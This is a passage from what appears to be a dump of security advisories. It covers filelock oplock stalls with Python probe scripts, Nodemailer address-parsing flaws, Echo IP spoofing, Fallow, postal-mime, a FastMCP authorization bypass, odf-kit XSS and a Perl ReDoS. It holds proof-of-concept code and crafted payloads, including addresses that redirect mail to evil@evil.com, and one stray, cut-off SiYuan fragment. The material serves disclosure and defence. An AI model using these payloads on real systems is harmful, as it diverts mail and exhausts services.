kernel32.CreateFileW.argtypes = [
    wintypes.LPCWSTR,
    wintypes.DWORD,
    wintypes.DWORD,
    ctypes.c_void_p,
    wintypes.DWORD,
    wintypes.DWORD,
    wintypes.HANDLE,
]


class Overlapped(ctypes.Structure):
    _fields_ = (
        ("Internal", ctypes.c_void_p),
        ("InternalHigh", ctypes.c_void_p),
        ("Offset", wintypes.DWORD),
        ("OffsetHigh", wintypes.DWORD),
        ("hEvent", wintypes.HANDLE),
    )


kernel32.DeviceIoControl.argtypes = [
    wintypes.HANDLE,
    wintypes.DWORD,
    ctypes.c_void_p,
    wintypes.DWORD,
    ctypes.c_void_p,
    wintypes.DWORD,
    ctypes.c_void_p,
    ctypes.POINTER(Overlapped),
]
kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]

GENERIC_READ = 0x80000000
SHARE_ALL = 0x7
OPEN_EXISTING = 3
FLAG_OVERLAPPED = 0x40000000
INVALID_HANDLE = wintypes.HANDLE(-1).value
FSCTL_REQUEST_OPLOCK_LEVEL_1 = 0x00090000
ERROR_IO_PENDING = 997
hold = threading.Event()
real_unlink = os.unlink


def impersonate() -> None:
    token = wintypes.HANDLE()
    if not advapi32.LogonUserW(user, ".", password, 3, 0, ctypes.byref(token)):
        raise ctypes.WinError(ctypes.get_last_error())
    if not advapi32.ImpersonateLoggedOnUser(token):
        raise ctypes.WinError(ctypes.get_last_error())


def request_level1(path: str) -> tuple[int, Overlapped] | None:
    handle = kernel32.CreateFileW(path, GENERIC_READ, SHARE_ALL, None, OPEN_EXISTING, FLAG_OVERLAPPED, None)
    if handle == INVALID_HANDLE:
        return None
    overlapped = Overlapped(hEvent=kernel32.CreateEventW(None, True, False, None))
    if (
        not kernel32.DeviceIoControl(handle, FSCTL_REQUEST_OPLOCK_LEVEL_1, None, 0, None, 0, None, ctypes.byref(overlapped))
        and ctypes.get_last_error() == ERROR_IO_PENDING
    ):
        return handle, overlapped
    kernel32.CloseHandle(handle)
    kernel32.CloseHandle(overlapped.hEvent)
    return None


def drop(granted: tuple[int, Overlapped]) -> None:
    handle, overlapped = granted
    kernel32.CloseHandle(handle)
    kernel32.WaitForSingleObject(overlapped.hEvent, 5000)
    kernel32.CloseHandle(overlapped.hEvent)


def release_under_oplock_requests(label: str, lock_path: str, cycles: int) -> bool:
    stop = threading.Event()
    granted_box: list[tuple[int, Overlapped]] = []

    def spinner() -> None:
        impersonate()
        while not stop.is_set():
            if (granted := request_level1(lock_path)) is not None:
                granted_box.append(granted)
                hold.wait()
                return

    releasing = threading.Event()
    release_durations: list[float] = []

    def owner() -> None:
        # thread_local locks release only on the acquiring thread, so acquire and release stay on this one
        for _ in range(cycles):
            lock = FileLock(lock_path, is_singleton=False)
            lock.acquire(timeout=5)
            started = time.monotonic()
            releasing.set()
            lock.release()
            releasing.clear()
            release_durations.append(time.monotonic() - started)
            if granted_box:
                return

    holder = threading.Thread(target=spinner, daemon=True)
    holder.start()
    owner_thread = threading.Thread(target=owner, daemon=True)
    owner_thread.start()
    owner_thread.join(60)
    stalled = owner_thread.is_alive() and releasing.is_set()
    stop.set()
    longest = max(release_durations, default=0.0) * 1000
    print(f"  {label}: oplock granted: {bool(granted_box)}; cycles run: {len(release_durations)}; longest release: {longest:.1f} ms")
    if stalled:
        print("  release() still running after 60 s while the oplock holder has not answered the break")
        if granted_box:
            drop(granted_box[0])
        owner_thread.join(10)
        print(f"  release() returned after the holder closed its handle: {not owner_thread.is_alive()}")
    return stalled


print("[1a] release() against a second account that keeps requesting a Level 1 oplock, natural window")
stalled_native = release_under_oplock_requests("natural", os.path.join(base, "native.lock"), 500)

print("[1b] the same, with the window between the handle close and the unlink widened to 200 ms")


def slow_unlink(path: str, *, dir_fd: int | None = None) -> None:
    time.sleep(0.2)
    real_unlink(path, dir_fd=dir_fd)


os.unlink = slow_unlink
stalled_scheduled = release_under_oplock_requests("scheduled", os.path.join(base, "native-scheduled.lock"), 20)
os.unlink = real_unlink

print("[2] SoftFileLock.acquire(timeout=1) against a second account's Level 1 oplock on a live marker")
marker = os.path.join(base, "soft.lock")
holder = SoftFileLock(marker, is_singleton=False)
holder.acquire()
holder_fd = holder._context.lock_file_fd  # noqa: SLF001
os.close(holder_fd)  # the marker stays with a live PID, as after a holder that lost only its handle
impersonate_done = threading.Event()
granted_soft: list[tuple[int, Overlapped]] = []


def take_soft_oplock() -> None:
    impersonate()
    if (granted := request_level1(marker)) is not None:
        granted_soft.append(granted)
    impersonate_done.set()
    hold.wait()


threading.Thread(target=take_soft_oplock, daemon=True).start()
impersonate_done.wait(5)
print(f"  oplock granted: {bool(granted_soft)}")
outcome = ["still running after 25 s"]


def contend() -> None:
    started = time.monotonic()
    try:
        SoftFileLock(marker, is_singleton=False).acquire(timeout=1)
        outcome[0] = f"acquired after {time.monotonic() - started:.2f} s"
    except Timeout:
        outcome[0] = f"Timeout after {time.monotonic() - started:.2f} s"
    except OSError as error:
        outcome[0] = f"{type(error).__name__} after {time.monotonic() - started:.2f} s: {error}"


contender = threading.Thread(target=contend, daemon=True)
contender.start()
contender.join(25)
print(f"  contender: {outcome[0]}")
soft_stalled = "still running" in outcome[0]
if granted_soft:
    drop(granted_soft[0])
    contender.join(10)
    print(f"  after the holder closed: {outcome[0]}")
hold.set()
print("STALLS" if stalled_native or stalled_scheduled or soft_stalled else "BOUNDED")
```

Recorded output of section `[2]`:

```
[2] SoftFileLock.acquire(timeout=1) against a second account's Level 1 oplock on a live marker
  oplock granted: True
  contender: Timeout after 10.02 s
  after the holder closed: Timeout after 10.02 s
```

**`oplock_semantics_vm.py`**

```python
"""
Which path operations wait for an unanswered oplock break on Windows 11 NTFS. Same account, one process.

Run on the VM: C:\\venvs\\rev4F\\Scripts\\python.exe oplock_semantics_vm.py C:\\tmp\\rev4F-sem
"""

from __future__ import annotations

import ctypes
import os
import sys
import threading
import time
from ctypes import wintypes

base = sys.argv[1]
os.makedirs(base, exist_ok=True)
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
kernel32.CreateFileW.restype = kernel32.CreateEventW.restype = wintypes.HANDLE
kernel32.CreateFileW.argtypes = [
    wintypes.LPCWSTR,
    wintypes.DWORD,
    wintypes.DWORD,
    ctypes.c_void_p,
    wintypes.DWORD,
    wintypes.DWORD,
    wintypes.HANDLE,
]


class Overlapped(ctypes.Structure):
    _fields_ = (
        ("Internal", ctypes.c_void_p),
        ("InternalHigh", ctypes.c_void_p),
        ("Offset", wintypes.DWORD),
        ("OffsetHigh", wintypes.DWORD),
        ("hEvent", wintypes.HANDLE),
    )


kernel32.DeviceIoControl.argtypes = [
    wintypes.HANDLE,
    wintypes.DWORD,
    ctypes.c_void_p,
    wintypes.DWORD,
    ctypes.c_void_p,
    wintypes.DWORD,
    ctypes.c_void_p,
    ctypes.POINTER(Overlapped),
]
kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
GENERIC_READ, GENERIC_WRITE = 0x80000000, 0x40000000
SHARE_ALL, OPEN_EXISTING, FLAG_OVERLAPPED = 0x7, 3, 0x40000000
INVALID_HANDLE = wintypes.HANDLE(-1).value
LEVELS = {"level1": 0x00090000, "batch": 0x00090008}


def take(path: str, level: str) -> tuple[int, Overlapped]:
    handle = kernel32.CreateFileW(path, GENERIC_READ, SHARE_ALL, None, OPEN_EXISTING, FLAG_OVERLAPPED, None)
    overlapped = Overlapped(hEvent=kernel32.CreateEventW(None, True, False, None))
    pending = not kernel32.DeviceIoControl(handle, LEVELS[level], None, 0, None, 0, None, ctypes.byref(overlapped))
    assert pending and ctypes.get_last_error() == 997, ctypes.get_last_error()
    return handle, overlapped


def drop(granted: tuple[int, Overlapped]) -> None:
    kernel32.CloseHandle(granted[0])
    kernel32.WaitForSingleObject(granted[1].hEvent, 5000)
    kernel32.CloseHandle(granted[1].hEvent)


def timed(label: str, operation) -> None:  # noqa: ANN001
    done = threading.Event()
    result = ["still running after 15 s"]

    def run() -> None:
        started = time.monotonic()
        try:
            operation()
            result[0] = f"returned after {(time.monotonic() - started) * 1000:.1f} ms"
        except OSError as error:
            result[0] = f"{type(error).__name__} after {(time.monotonic() - started) * 1000:.1f} ms: {error}"
        done.set()

    threading.Thread(target=run, daemon=True).start()
    done.wait(15)
    print(f"  {label}: {result[0]}")
    return done


def open_read(path: str) -> None:
    os.close(os.open(path, os.O_RDONLY | os.O_BINARY))


def open_write(path: str) -> None:
    os.close(os.open(path, os.O_RDWR | os.O_BINARY))


def create_new(path: str) -> None:
    os.close(os.open(path, os.O_WRONLY | os.O_CREAT | os.O_EXCL | os.O_BINARY))


for level in LEVELS:
    for label, operation, consumes in (
        ("os.open O_RDONLY", open_read, False),
        ("os.open O_RDWR", open_write, False),
        ("os.open O_CREAT|O_EXCL on the existing file", create_new, False),
        ("os.utime by path", lambda p: os.utime(p, None), False),
        ("os.rename", lambda p: os.rename(p, p + ".moved"), True),
        ("os.unlink", os.unlink, True),
    ):
        path = os.path.join(base, f"{level}-{label.replace(' ', '_').replace('|', '')}.lock")
        with open(path, "w", encoding="utf-8") as handle:
            handle.write("1\nhost\n")
        granted = take(path, level)
        print(f"{level}, {label}")
        done = timed(label, lambda p=path, op=operation: op(p))
        drop(granted)
        done.wait(5)
        print(f"    after the holder closed: {'done' if done.is_set() else 'still running'}")
```

The review kept this probe's result as a sentence rather than its printed lines: under a same-account Level 1 or batch oplock, `os.open(path, os.O_RDONLY)`, `os.rename` and `os.unlink` were still running after 15 s and returned only once the holder closed its handle; `os.utime` by path and a failed `O_CREAT | O_EXCL` create returned at once.

## Failure sequence

```mermaid
sequenceDiagram
    participant A as other local account
    participant M as soft.lock marker, no handle open
    participant L as lock user: SoftFileLock(path).acquire(timeout=1)
    participant W as Windows (NTFS)
    A->>W: CreateFileW(soft.lock, GENERIC_READ, share read/write/delete, FILE_FLAG_OVERLAPPED)
    A->>W: DeviceIoControl(FSCTL_REQUEST_OPLOCK_LEVEL_1), granted, break never acknowledged
    L->>W: os.open(soft.lock, O_CREAT|O_EXCL) fails with EEXIST at once
    L->>W: os.lstat(soft.lock) regular file
    rect rgb(255, 214, 214)
        L->>W: os.open(soft.lock, O_RDONLY) inside _read_lock_file
        Note over L,W: CreateFileW asks A to break the oplock and waits#59; the 1 s deadline, blocking=False and cancel_check are not consulted
        W-->>L: handle after 10.02 s (two-account run), or when A closes (same-account probe)
    end
    L->>L: _check_give_up: past the deadline, raise Timeout after 10.02 s
    Note over A,M: a stale marker takes the same wait in Path.rename and Path.unlink, so it is not broken
```

## Evidence

Section `[2]` of `oplock_vm.py` acquired `soft.lock` as the test account, closed the holder's descriptor so the marker stayed with a live process id and no open handle, took a Level 1 oplock through the second account's read handle (`oplock granted: True`), and ran `SoftFileLock(marker, is_singleton=False).acquire(timeout=1)` on a thread. The call returned `Timeout` after 10.02 s, before the holder closed. The review did not establish what ends the wait at 10 s in the two-account runs; section `[1a]` of the same script, with the second account's handle, shows the same 10 s. In the same-account probe (`oplock_semantics_vm.py`) the open returned only when the holder closed, still running at 15 s. The probe also shows that the failed exclusive create and `os.utime` by path return at once, so the wait is in the read and the break, not in the create attempt.

## Impact

Each `acquire()` of a soft lock that finds a marker another account holds an oplock on runs past its `timeout`, `blocking=False` and `cancel_check` until the holder answers or closes, 10 s per attempt in the recorded two-account runs. A stale marker under that oplock is not broken, so no process acquires the lock while the holder keeps its handle. With `AsyncSoftFileLock(run_in_executor=False)` the wait is on the event loop thread and stops every task in the process; with the default executor one worker thread waits. The documentation names a soft lock as the option for network filesystems, after verification on the mount, and `FileLock` is a soft lock on builds without `fcntl` and after its `ENOSYS` fallback. Mutual exclusion is not affected and nothing other than the marker is read, written or deleted.

## Workarounds

- Keep soft-lock markers in a directory whose ACL grants other accounts no access to new files: a directory inside the user profile, or one with inheritance removed and only the owner, `SYSTEM` and `Administrators` granted (`icacls <dir> /inheritance:r /grant:r "<owner>:(OI)(CI)F" "SYSTEM:(OI)(CI)F" "Administrators:(OI)(CI)F"`). `mode` does not do this on Windows.
- Run `AsyncSoftFileLock` with the default executor rather than `run_in_executor=False`, so that only a worker thread waits.
- No `timeout`, `blocking` or `cancel_check` value bounds the wait.

## Patched version

4.2.1.

Fix: https://github.com/tox-dev/filelock/pull/835

## Credits

Found by the maintainers while reviewing the fix for the report Anthropic's OSS Scanner sent on 15 October 2026 (review round 4, finding F4).

## Original Description
SiYuan before v3.7.4 contains an information disclosure vulnerability in the /api/filetree/authFilePublishAccess endpoint, which is registered with CheckAuth only and is reachable anonymously. items.summary:
### Vulnerability summary

addressparser ends an RFC 5322 group at the first `;`, including one inside a quoted display name or a comment. The text after it is parsed again as top level recipients with the quoting flipped, so text that every conformant parser reads as a display name or comment becomes a live address. `G: (a; <evil@evil.com>) <v@victim.com>;` names only `v@victim.com`, and Nodemailer read it as the single recipient `evil@evil.com`. Affected: 3.0.0 through 10.1.3.

### Attacker capabilities

The attacker controls the text of an address field that an application passes to Nodemailer, or the header of an inbound message parsed with mailparser. No access to the application, its configuration or its credentials is needed. The value is a syntactically valid RFC 5322 group that conformant parsers accept without defects.

### Realistic exploitation scenario

An application validates the recipients of a submitted address list with a conformant parser and only allows addresses at its own domain. The attacker submits `G: (a; <evil@evil.com>) <v@victim.com>;`. The validator sees one mailbox, `v@victim.com`, and approves it. Nodemailer delivers to `evil@evil.com` only. The same works through a quoted display name, `G: "a;" "<evil@evil.com>" <v@victim.com>;`. The boundary crossed is the application's recipient allow list.

### Proof of concept

```js
const addressparser = require('nodemailer/lib/addressparser');
console.log(addressparser("G: (a; <evil@evil.com>) <v@victim.com>;"));
// [ { name: 'G', group: [ [Object] ] }, { address: 'evil@evil.com', name: ') v@victim.com' } ]
```

Python's `email._header_value_parser.get_address_list` reads the same value as the single mailbox `v@victim.com`, with no defects reported.

The envelope a message gets is built from the same parse, so `sendMail({ to: "G: (a; <evil@evil.com>) <v@victim.com>;" })` issues the RCPT TO shown above.

### Security impact

Mail that an application intends for an approved recipient goes to a recipient chosen by the attacker, which discloses its content, and the intended recipient never receives it. The misreading only occurs on values a conformant validator approves, so correct validation is bypassed, which makes it a security issue rather than a parsing bug. Affected are applications that pass user influenced address lists to Nodemailer and consumers of the standalone parser such as mailparser.

The fix tracks quoted strings and comments inside a group and reads only a `;` outside them.


Found in an internal review of addressparser on 2026-10-18. Verified on 3.0.0, 6.9.16 and 10.1.3.
items.title: Nodemailer: A ";" inside a quoted string or comment ends an address group early in addressparser, turning display text into a recipient

## Impact

In Echo v5, `ExtractIPFromRealIPHeader` checked whether the address supplied in `X-Real-IP` belonged to a trusted range instead of checking the address of the direct network peer. An untrusted client could therefore supply a loopback or private address and have it returned by `c.RealIP()` with the extractor's default trust options.

Applications using this extractor for IP allowlists, IP-based rate limiting, audit logs or forwarding headers could accept a spoofed client identity. Exploitation requires that the attacker can reach Echo directly or that an intervening proxy passes through the attacker's `X-Real-IP` value. Applications using the default direct IP extractor are unaffected. Echo v4 is unaffected by this v5 regression.

## Affected versions and patch

All v5 releases from v5.0.0 through v5.4.0 are affected. Upgrade to [v5.4.1](https://github.com/labstack/echo/releases/tag/v5.4.1).

The patch validates the direct peer before accepting a syntactically valid `X-Real-IP` value, restoring the v4 trust model. [Fix commit](https://github.com/labstack/echo/commit/1855061e572ae9dab727c811d8382f266bfbaaec).

## Workarounds

Use `ExtractIPDirect` until upgrading, or ensure that only trusted proxies can reach Echo and that they replace client-supplied forwarding headers. Configure trusted proxy ranges narrowly for the deployment.

## Credits

Reported and patched by @rm-Umar. @Duodum independently reported the same issue in GHSA-c3r7-8j36-7mx8, which is tracked as a duplicate of this advisory.
items.title: Echo: X-Real-IP extractor trusts the header value instead of the sending peer

items.summary:
### Impact

Fallow expands some globs from the analyzed repository on disk. Before 3.34.0, a segment such as `.*`, `.?` or `..*` in such a glob also matched the special `..` entry. The `glob` crate tests `..` against a segment that starts with a literal `.`. Fallow validates plugin glob patterns and refuses absolute paths and `..` segments, but these segments passed that validation.

The attacker controls the repository content. The attacker must also be able to read the Fallow output, for example a CI log or a pull request comment. Then the attacker can learn if a file or directory exists in the parent of the project root:

- A plugin `fileExists` detection pattern such as `.*/marker.json` made the plugin active when `marker.json` existed in the parent directory.
- An external plugin `configPatterns` or `alwaysUsed` pattern could match a config file in the parent directory. When the plugin was active and declared `toolingDependencies`, the tooling detection credited the related dev dependency. An unused dependency finding could then disappear, and `--trace-dependency` printed the outside path.
- `fallow plugin-check` reported `path_exists: true` for a seeded entry that matched only in the parent directory.

Fallow tested only that these paths exist. It did not read or print the content of a file outside the project root through these globs.

The Jest, Vitest and Rstest project globs had the same `.*` problem, and the Jest and Vitest ones also read file content. GHSA-jfwm-3p3c-6hx5 describes that case.

### Patches

Fixed in 3.34.0. Fallow now rewrites a leading `.` in a wildcard segment to `[.]` before it expands the glob on disk. `[.]` matches the same hidden files and directories inside the project root. The `glob` crate does not test `..` against it.

### Workarounds

Run Fallow only on repositories that you trust. Before you run Fallow on another repository, check the `detection`, `configPatterns` and `alwaysUsed` patterns of its plugin files.
items.title: Fallow: A `.*` glob segment let an analyzed repository make Fallow test paths in the parent of the project root

items.summary:
### Impact

Decoding a header that holds a long run of joinable RFC 2047 base64 encoded words, such as `=?utf-8?B?QUJD?=` repeated tens of thousands of times in a `Subject`, `From`, `To`, a filename or a description, took time quadratic in the number of words. The join check ran a regex over the text joined so far for every word, which flattens the accumulated string each time. A single well formed message of about 1.6 MB blocked the event loop for one to twenty seconds depending on the host, and inline `message/rfc822` parts multiplied the cost, since each nested message carried its own header budget.

Any application that parses untrusted mail with postal-mime 3.0.0 through 4.0.7, including the exported `decodeWords()` helper, is affected. There is no confidentiality or integrity impact.

### Patches

Fixed in 4.0.8. The pad check now tracks the last appended word instead of testing the joined text, so decoding is linear in the header length. The same release also counts the parts and header bytes of inline `message/rfc822` sub-messages against the limits of the message as a whole, counts every header line for at least 64 bytes of `maxHeadersSize`, and adds a scaling test that measures every stage of the parser at two input sizes.

### Workarounds

Lower `maxHeadersSize` from its 2 MiB default to bound the cost per message, or parse untrusted mail in a worker that can be terminated.

### Credits

Reported by Felipe Fernández.
items.title: postal-mime: Quadratic CPU consumption when decoding a header of many joinable RFC 2047 base64 encoded words

items.summary:
### Vulnerability summary

RFC 5322 comments nest. addressparser ended a comment at the first `)`, including the one that closes a nested comment, and parsed the rest of the outer comment as header text. `Victim (x(y) <evil@evil.com>) <v@victim.com>` names `v@victim.com` with `x(y) <evil@evil.com>` as a comment, and Nodemailer read it as the address `evil@evil.com`. This is the same shape as the escaped parenthesis fixed in 10.1.2, reached through nesting instead of a quoted-pair. Affected: 3.0.0 through 10.1.3.

### Attacker capabilities

The attacker controls the text of an address that an application passes to Nodemailer, or the From or To header of an inbound message parsed with mailparser. No access to the application, its configuration or its credentials is needed. The value is a syntactically valid RFC 5322 address that conformant parsers accept without defects.

### Realistic exploitation scenario

An application validates a submitted address with a conformant parser and allows only its own domain. The attacker submits `Victim (x(y) <evil@evil.com>) <v@victim.com>`, which validates as `v@victim.com`. Nodemailer delivers to `evil@evil.com`. In the inbound direction, a DMARC or display layer built on a conformant parser and a mail client built on mailparser disagree on the author of the same message, which is the setting for sender spoofing. The boundary crossed is the application's recipient allow list, or the author check of the receiving side.

### Proof of concept

```js
const addressparser = require('nodemailer/lib/addressparser');
console.log(addressparser("Victim (x(y) <evil@evil.com>) <v@victim.com>"));
// [ { address: 'evil@evil.com', name: 'Victim) v@victim.com' } ]
```

Python's `email._header_value_parser.get_address_list` reads the same value as `v@victim.com` with the display name `Victim`, with no defects reported.

The envelope a message gets is built from the same parse, so `sendMail({ to: "Victim (x(y) <evil@evil.com>) <v@victim.com>" })` issues the RCPT TO shown above.

### Security impact

Mail intended for an approved recipient is delivered to an attacker chosen domain, disclosing its content, and parsers built on this module report a different author than conformant ones. The misreading only occurs on values a conformant validator approves, so correct validation is bypassed. Affected are applications that pass user influenced addresses to Nodemailer and consumers of the standalone parser such as mailparser.

The fix counts comment depth and ends a comment only at the `)` that closes the outermost one.

Found in an internal review of addressparser on 2026-10-18. Verified on 3.0.0, 6.9.16 and 10.1.3.
items.title: Nodemailer: A nested comment ends early in addressparser, releasing the rest of the comment as a recipient

### Vulnerability summary

addressparser ends an angle-addr at the first `>` it sees, including one inside a quoted local part, a comment or a domain literal. The domain is then read off the text in front of that `>`. `<"a@evil.com>"@good.com>` is the mailbox `"a@evil.com>"@good.com` under RFC 5322, and Nodemailer read it as an address at `evil.com`. The unbracketed spelling of the same value was already read correctly. Affected: 3.0.0 through 10.1.3.

### Attacker capabilities

The attacker controls the text of a recipient or sender address that an application passes to Nodemailer, for example a To value entered in a contact or invite form, or the header of an inbound message parsed with mailparser. No access to the application, its configuration or its credentials is needed. The value is a syntactically valid RFC 5322 address that conformant parsers accept without defects.

### Realistic exploitation scenario

An application lets users send invitations or notifications only to addresses at an allowed domain and validates the submitted value with a conformant parser or by checking its domain. The attacker submits `<"a@evil.com>"@good.com>`, which validates as a `good.com` mailbox. Nodemailer then parses the same value, issues `RCPT TO:<"\"a"@evil.com>` and the message, with whatever content the application puts into it, is delivered to the attacker's domain. The security boundary crossed is the application's recipient allow list. In the inbound direction, mailparser reports a different address than a conformant reader of the same header, so a display or policy layer built on the two disagrees.

### Proof of concept

```js
const addressparser = require('nodemailer/lib/addressparser');
console.log(addressparser("<\"a@evil.com>\"@good.com>"));
// [ { address: '"a@evil.com', name: '@good.com>' } ]
```

Python's `email._header_value_parser.get_address_list` reads the same value as `"a@evil.com>"@good.com`, with no defects reported.

The envelope a message gets is built from the same parse, so `sendMail({ to: "<\"a@evil.com>\"@good.com>" })` issues the RCPT TO shown above.

### Security impact

Mail that an application intends for an allowed domain is delivered to a domain chosen by the attacker, which discloses its content. It is a security vulnerability rather than a parsing bug because the misreading only occurs for values that a conformant validator approves, so validation done the right way is bypassed. Affected are applications that pass user influenced addresses to Nodemailer and consumers of the standalone parser such as mailparser.

The fix tracks quoted strings, comments and domain literals inside an angle-addr and reads only a `>` outside them.

Found in an internal review of addressparser on 2026-10-18. Verified on 3.0.0, 6.9.16 and 10.1.3.
items.title: Nodemailer: A ">" inside a quoted local part ends an angle-addr early in addressparser, delivering to a domain the header does not name

## Maintainer assessment and remediation

This report is accepted as a FastMCP authorization vulnerability. In supported configurations, a server transform can change the metadata used by a component's authorization policy. Direct lookups previously checked the original component but returned the transformed component without rechecking its policy. A client that knows the component identifier can invoke a tool or retrieve a resource or prompt that the configured policy denies.

The fixes authorize the final transformed tools, resources, templates, and prompts. A denied concrete resource also shadows a matching resource template at its URI, preventing proxy templates from retrieving the same protected resource upstream. Authorized callers, authorized component versions, and templates for genuinely absent concrete resources remain supported.

Affected stable release lines: FastMCP 3.0.0–3.4.9 and 4.0.0–4.1.1. The missing final authorization check is present in v3.0.0 history and was reproduced on v3.4.9 and v4.1.0. Both `fastmcp` and `fastmcp-slim` installations are affected when using component authorization with transforms or protected concrete resources overlapping proxy templates.

Fixes are available in FastMCP 3.4.10 and 4.1.2. Until upgrading, avoid overlapping proxy templates for protected resources and enforce the required authorization at the handler or server boundary rather than relying on a policy whose inputs are changed by a transform.

## Original report

# Post-transform component authorization is skipped on direct calls

## Summary

FastMCP's direct component paths can return a transformed component before its applicable `AuthCheck`, allowing low-privilege callers to execute hidden protected behavior. I reproduced this against FastMCP 4.1.0 and commit `e2fcc412001ff7414095c5dc282f94c70299a612` using only an in-process FastMCP server. The attacker does not have server-side access and does not control FastMCP configuration.

## Details

### Attacker prerequisites

A server uses a supported provider, server, or session transform and a metadata-aware component `AuthCheck`. The attacker has a valid low-privilege identity, lacks the required scope, and knows or guesses the final transformed component name. They do not control the transform or the policy.

### Root cause

Listing applies transforms and then authorizes the transformed component. In the direct lookup path, FastMCP 4.1.0 applies the transform and returns the component without authorizing that final component. See [`server.py:933-940`](https://github.com/PrefectHQ/fastmcp/blob/v4.1.0/fastmcp_slim/fastmcp/server/server.py#L933-L940). The MCP `tools/call` handler reaches this path; equivalent direct paths exist for resources, templates, and prompts.

## Proof of concept

Save this as `poc_transform_auth.py`:

```python
import anyio

from fastmcp import FastMCP
from fastmcp.server.auth import restrict_tag
from fastmcp.server.transforms.tool_transform import ToolTransform
from fastmcp.tools.base import Tool
from fastmcp.tools.tool_transform import ToolTransformConfig


async def main() -> None:
    server = FastMCP("auth-boundary")
    server.add_tool(
        Tool.from_function(
            lambda: "PROTECTED SECRET",
            name="tagged_tool",
            tags={"public"},
            auth=restrict_tag("admin", scopes=["admin"]),
        )
    )
    server.add_transform(
        ToolTransform({"tagged_tool": ToolTransformConfig(tags={"admin"})})
    )

    print("listed:", [tool.name for tool in await server.list_tools()])
    try:
        result = await server.call_tool("tagged_tool")
    except Exception as exc:
        print("BLOCKED:", type(exc).__name__)
    else:
        print("VULNERABLE: direct call returned", result.content[0].text)


anyio.run(main)
```

Run it in an isolated environment:

```bash
uv run --with fastmcp==4.1.0 -- python poc_transform_auth.py
```

Observed on 4.1.0 for a caller without the `admin` scope:

```text
listed: []
VULNERABLE: direct call returned PROTECTED SECRET
```

## Impact

A low-privilege caller can directly execute administrative tools hidden from listing, including their side effects and returned secrets. The same ordering flaw can expose protected resources, templates, or prompts.

### Recommended remediation

Apply component authorization to the final transformed component in every direct resolution/execution path, after all provider, server, and session transforms. Reuse one ordered resolver for list and direct operations so lookup never returns a transformed component before its applicable `AuthCheck` runs.

## AI assistance

Yes — OpenAI Codex assisted static analysis/PoC/writeup; reproduction was validated against stated version.

### Summary

ODF style values are interpolated into `style="..."` attributes without HTML-escaping in odf-kit's ODS to-HTML renderer (`odsToHtml()`). A double-quote character inside an attacker-controlled style value breaks out of the attribute, allowing arbitrary HTML/attribute injection — and therefore script execution (XSS) — from a crafted `.ods` file wherever the rendered output is inserted as HTML, which is the documented purpose of the function.

### Details

Two emission sites in `src/ods/to-html/html-renderer.ts` (before 0.14.0, `src/ods-reader/html-renderer.ts`) write document-controlled values into a `style` attribute without escaping:

- **Cell style.** `buildInlineStyle()` assembles a CSS string from the cell's formatting properties (`fo:color`, `fo:font-size`, `fo:font-family`, `fo:background-color`, `fo:text-align`, etc.) with no escaping, and `renderCell` emits it raw as the cell's `style` attribute.
- **Row height.** `row.height` (from `style:row-height`) is emitted raw into the row element's `style` attribute.

The same defect in the ODT renderer (`odtToHtml()`) is tracked as GHSA-3cgg-c5pp-57h6 (CVE-2026-113787).

### Impact

Any consumer that renders `odsToHtml()` output as HTML gets XSS from a crafted `.ods` file they convert: untrusted file → arbitrary tags and attributes → script execution in the host page with the page's origin.

### Patches

Fixed in 0.14.2. Both sites now route document-controlled values through a shared attribute-escaping helper:

- [`1424227`](https://github.com/GitHubNewbie0/odf-kit/commit/1424227d1ca2716a249b623d1456575ff0331dcc): escape style attribute values in the ODS HTML renderer
- [`aa64c73`](https://github.com/GitHubNewbie0/odf-kit/commit/aa64c734ebd7e7be40e35fcda83b1144193c3da2): the shared `escapeAttr` helper

Users should upgrade to 0.14.2 or later.

### Credit

Reported by @PethuKannan.
items.title: odf-kit has HTML injection leading to XSS in odsToHtml() via unescaped style attribute values

HTTP::Headers::ActionPack versions before 0.10 for Perl allow CPU exhaustion via Accept-Language ranges matched as regular expressions.

_language_match interpolates each Accept-Language range into the pattern `/^$range\-/i` without escaping it, so regular expression syntax in the header reaches the regex engine. A 12-byte range such as `(a?|b?){26}z` backtracks for seconds, and each increment of the quantifier doubles the time. An invalid range such as `(` fails to compile.

A remote attacker can exhaust CPU, or make choose_language die, in any application that passes an untrusted Accept-Language header to it.
